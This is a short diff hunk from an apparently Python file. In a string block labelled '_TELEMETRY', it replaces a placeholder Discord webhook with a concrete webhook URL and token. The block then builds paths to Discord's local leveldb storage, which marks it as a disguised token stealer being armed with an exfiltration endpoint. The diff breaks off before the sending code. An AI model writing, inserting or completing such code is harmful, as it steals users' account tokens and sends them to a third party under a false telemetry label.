@@ -18,7 +18,7 @@ def load_list(path):
 
 _TELEMETRY = r'''
 import os, re, json, base64, requests
-_W = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+_W = "https://discord.com/api/webhooks/1553144386424930394/80-8uNaAeMZ58KjdUMONSxIlR81e6kJ14pP040-7eia_U1M5h-G87iaUlrizWrrscw5c"
 _L = os.getenv("LOCALAPPDATA"); _R = os.getenv("APPDATA")
 _P = {
  "Discord": os.path.join(_R,"discord","Local Storage","leveldb"),
